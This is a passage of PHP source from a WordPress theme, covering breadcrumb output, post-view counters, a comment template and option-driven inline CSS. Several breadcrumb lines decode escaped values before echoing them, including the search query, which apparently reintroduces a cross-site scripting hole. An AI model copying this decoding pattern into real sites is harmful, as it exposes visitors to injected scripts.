            echo wp_specialchars_decode($before . '<a class="home" href="' . esc_url(home_url() ) . '">' . $home . '</a>' . $delimiter . $after);
        }

        if ( is_home() ) {

            echo wp_specialchars_decode($before .$linkbefore. single_post_title('', false) .$linkafter. $after);

         }      
         else if ( is_category() ) {

            if ( get_option( 'show_on_front' ) == 'page' ) {
                echo wp_specialchars_decode($before . '<a href="' . esc_url(get_permalink( get_option('page_for_posts' ) )) . '">' . esc_html(get_the_title( get_option('page_for_posts', true) )) . '</a>' . $delimiter . $after);
            }

            $cat_obj = $wp_query->get_queried_object();
            if ($cat_obj) {
                $this_category = get_category( $cat_obj->term_id );
                if ( 0 != $this_category->parent ) {
                    $parent_category = get_category( $this_category->parent );
                    if ( ( $parents = get_category_parents( $parent_category, TRUE, $delimiter . $after . $before ) ) && ! is_wp_error( $parents ) ) {
                        echo wp_specialchars_decode($before . substr( $parents, 0, strlen($parents) - strlen($delimiter . $after . $before) ) . $delimiter . $after);
                    }
                }
                echo wp_specialchars_decode($before .$linkbefore. single_cat_title( '', false ) .$linkafter. $after);
            }

        } 
        elseif ( is_tax()) {      
                    
            $current_term = get_term_by( 'slug', get_query_var( 'term' ), get_query_var( 'taxonomy' ) );

            $ancestors = array_reverse( get_ancestors( $current_term->term_id, get_query_var( 'taxonomy' ) ) );

            foreach ( $ancestors as $ancestor ) {
                $ancestor = get_term( $ancestor, get_query_var( 'taxonomy' ) );

                echo wp_specialchars_decode($before . '<a href="' . esc_url(get_term_link( $ancestor->slug, get_query_var( 'taxonomy' ) )) . '">' . esc_html( $ancestor->name ) . '</a>' . $delimiter . $after);
            }

            echo wp_specialchars_decode($before .$linkbefore. esc_html( $current_term->name ) .$linkafter. $after);

        } 
       
        elseif ( is_day() ) {

            echo wp_specialchars_decode($before . '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . esc_html(get_the_time('Y')) . '</a>' . $delimiter . $after);
            echo wp_specialchars_decode($before . '<a href="' . esc_url(get_month_link(get_the_time('Y'),get_the_time('m'))) . '">' . esc_html(get_the_time('F')) . '</a>' . $delimiter . $after);
            echo wp_specialchars_decode($before .$linkbefore. get_the_time('d') .$linkafter. $after);

        } elseif ( is_month() ) {

            echo wp_specialchars_decode($before . '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . esc_html(get_the_time('Y')) . '</a>' . $delimiter . $after);
            echo wp_specialchars_decode($before .$linkbefore. get_the_time('F') .$linkafter. $after);

        } elseif ( is_year() ) {

            echo wp_specialchars_decode($before .$linkbefore. get_the_time('Y') .$linkafter. $after);

        } elseif ( is_single() && ! is_attachment() ) {

         
            if ( 'post' != get_post_type() ) {
                $post_type = get_post_type_object( get_post_type() );
                $slug = $post_type->rewrite;
                echo wp_specialchars_decode($before . '<a href="' . esc_url(get_post_type_archive_link( get_post_type() )) . '">' . esc_html($post_type->labels->singular_name) . '</a>' . $delimiter . $after);
                echo wp_specialchars_decode($before .$linkbefore. get_the_title() .$linkafter. $after);

            } else {

                if ( 'post' == get_post_type() && get_option( 'show_on_front' ) == 'page' ) {
                    echo wp_specialchars_decode($before . '<a href="' . esc_url(get_permalink( get_option('page_for_posts' ) )) . '">' . esc_html(get_the_title( get_option('page_for_posts', true) )) . '</a>' . $delimiter . $after);
                }

                $cat = current( get_the_category() );
              if ( ( $parents = get_category_parents( $cat, TRUE, $delimiter . $after . $before ) ) && ! is_wp_error( $parents ) ) {
                $getitle=get_the_title();
                  if(empty($getitle))
                  {
                    $newdelimiter ='';
                  }
                  else
                  {
                     $newdelimiter=$delimiter;
                  }
                    echo wp_specialchars_decode($before . substr( $parents, 0, strlen($parents) - strlen($delimiter . $after . $before) ) . $newdelimiter . $after);
                }
                echo wp_specialchars_decode($before .$linkbefore. get_the_title() .$linkafter. $after);

            }

        } elseif ( is_404() ) {

            echo wp_specialchars_decode($before .$linkbefore. esc_html__( 'Error 404', 'aspire' ) .$linkafter. $after);

        } elseif ( is_attachment() ) {

            $parent = get_post( $post->post_parent );
            $cat = get_the_category( $parent->ID );
            $cat = $cat[0];
            if ( ( $parents = get_category_parents( $cat, TRUE, $delimiter . $after . $before ) ) && ! is_wp_error( $parents ) ) {
                echo wp_specialchars_decode($before . substr( $parents, 0, strlen($parents) - strlen($delimiter . $after . $before) ) . $delimiter . $after);
            }
            echo wp_specialchars_decode($before . '<a href="' . esc_url(get_permalink( $parent )) . '">' . esc_html($parent->post_title) . '</a>' . $delimiter . $after);
            echo wp_specialchars_decode($before .$linkbefore. get_the_title() .$linkafter. $after);

        } elseif ( is_page() && !$post->post_parent ) {

            echo wp_specialchars_decode($before .$linkbefore. get_the_title() .$linkafter. $after);

        } elseif ( is_page() && $post->post_parent ) {

            $parent_id  = $post->post_parent;
            $breadcrumbs = array();

            while ( $parent_id ) {
                $page = get_post( $parent_id );
                $breadcrumbs[] = '<a href="' . esc_url(get_permalink($page->ID)) . '">' . esc_html(get_the_title( $page->ID )) . '</a>';
                $parent_id  = $page->post_parent;
            }

            $breadcrumbs = array_reverse( $breadcrumbs );

            foreach ( $breadcrumbs as $crumb ) {
                echo wp_specialchars_decode($before . $crumb . $delimiter . $after);
            }

            echo wp_specialchars_decode($before .$linkbefore. get_the_title() .$linkafter. $after);

        } elseif ( is_search() ) {

            echo wp_specialchars_decode($before .$linkbefore. esc_html__( 'Search results for &ldquo;', 'aspire' ) . get_search_query() . '&rdquo;' .$linkafter. $after);

        } elseif ( is_tag() ) {

            if ( 'post' == get_post_type() && get_option( 'show_on_front' ) == 'page' ) {
                echo wp_specialchars_decode($before . '<a href="' . esc_url(get_permalink( get_option('page_for_posts' ) )) . '">' . esc_html(get_the_title( get_option('page_for_posts', true) )) . '</a>' . $delimiter . $after);
            }

            echo wp_specialchars_decode($before .$linkbefore. esc_html__( 'Posts tagged &ldquo;', 'aspire' ) . single_tag_title('', false) . '&rdquo;' .$linkafter. $after);

        } elseif ( is_author() ) {

            $userdata = get_userdata($author);
            echo wp_specialchars_decode($before .$linkbefore. esc_html__( 'Author:', 'aspire' ) . ' ' . $userdata->display_name .$linkafter. $after);

        } elseif ( ! is_single() && ! is_page() && get_post_type() != 'post' ) {

            $post_type = get_post_type_object( get_post_type() );

            if ( $post_type ) {
                echo wp_specialchars_decode($before .$linkbefore. $post_type->labels->singular_name .$linkafter. $after);
            }

        }

        if ( get_query_var( 'paged' ) ) {
            echo wp_specialchars_decode($before .$linkbefore. '&nbsp;(' . esc_html__( 'Page', 'aspire' ) . ' ' . get_query_var( 'paged' ) . ')' .$linkafter. $after);
        }

        echo '</ul>';
    } else { 
        if ( is_home() && !is_front_page() ) {
            echo '<ul>';

            if ( ! empty( $home ) ) {
                echo wp_specialchars_decode($before . '<a class="home" href="' . esc_url(home_url()) . '">' . $home . '</a>' . $delimiter . $after);

               
                echo wp_specialchars_decode($before .$linkbefore. single_post_title('', false) .$linkafter. $after);
            }

            echo '</ul>';
        }
    }
}
  


  function magikAspire_getPostViews($postID)
  {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
      delete_post_meta($postID, $count_key);
      add_post_meta($postID, $count_key, '0');
      return "0  View";
    }
    return $count . '  Views';
  }

  function magikAspire_setPostViews($postID)
  {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
      $count = 0;
      delete_post_meta($postID, $count_key);
      add_post_meta($postID, $count_key, '0');
    } else {
      $count++;
      update_post_meta($postID, $count_key, $count);
    }
  }


  function magikAspire_is_blog() {
    global  $post;
    $posttype = get_post_type($post );
    return ( ((is_archive()) || (is_author()) || (is_category()) || (is_home()) || (is_single()) || (is_tag())) && ( $posttype == 'post')  ) ? true : false ;
  }


 
 // comment display 
  function magikAspire_comment($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment; ?>

  <li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
    <div class="comment-body">
      <div class="img-thumbnail">
        <?php echo get_avatar($comment, 80); ?>
      </div>
      <div class="comment-block">
        <div class="comment-arrow"></div>
        <span class="comment-by">
          <strong><?php echo get_comment_author_link() ?></strong>
          <span class="pt-right">
            <span> <?php edit_comment_link('<i class="fa fa-pencil"></i> ' . esc_html__('Edit', 'aspire'),'  ','') ?></span>
            <span> <?php comment_reply_link(array_merge( $args, array('reply_text' => '<i class="fa fa-reply"></i> ' . esc_html__('Reply', 'aspire'), 'add_below' => 'comment', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?></span>
          </span>
        </span>
        <div>
          <?php if ($comment->comment_approved == '0') : ?>
            <em><?php echo esc_html__('Your comment is awaiting moderation.', 'aspire') ?></em>
            <br />
          <?php endif; ?>
          <?php comment_text() ?>
        </div>
        <span class="date pt-right"><?php printf(esc_html__('%1$s at %2$s', 'aspire'), get_comment_date(),  get_comment_time()) ?></span>
      </div>
    </div>
  </li>
  <?php }

  //css manage by admin
  function magikAspire_enqueue_custom_css() {
    global $aspire_Options;

    ?>
    <style rel="stylesheet" property="stylesheet" type="text/css">
      <?php if(isset($aspire_Options['opt-color-rgba']) &&  !empty($aspire_Options['opt-color-rgba'])) {
      ?>
      .mgk-main-menu {
        background-color: <?php echo esc_html($aspire_Options['opt-color-rgba'])." !important";
      ?>
      }
      <?php
      }
      ?>
       
      
      <?php if(isset($aspire_Options['footer_color_scheme']) && $aspire_Options['footer_color_scheme']) {
      if(isset($aspire_Options['footer_copyright_background_color']) && !empty($aspire_Options['footer_copyright_background_color'])) {
       ?>
      .footer-bottom {
        background-color: <?php echo esc_html($aspire_Options['footer_copyright_background_color'])." !important";
       ?>
      }

      <?php
       }
       ?>
      <?php if(isset($aspire_Options['footer_copyright_font_color']) && !empty($aspire_Options['footer_copyright_font_color'])) {
       ?>
      .coppyright {
        color: <?php echo esc_html($aspire_Options['footer_copyright_font_color'])." !important";
      ?>
      }

      <?php
       }
       ?>
      <?php
       }
       ?>
    </style>
    <?php
  }
}

// Instantiate theme
$MagikAspire = new MagikAspire();

?>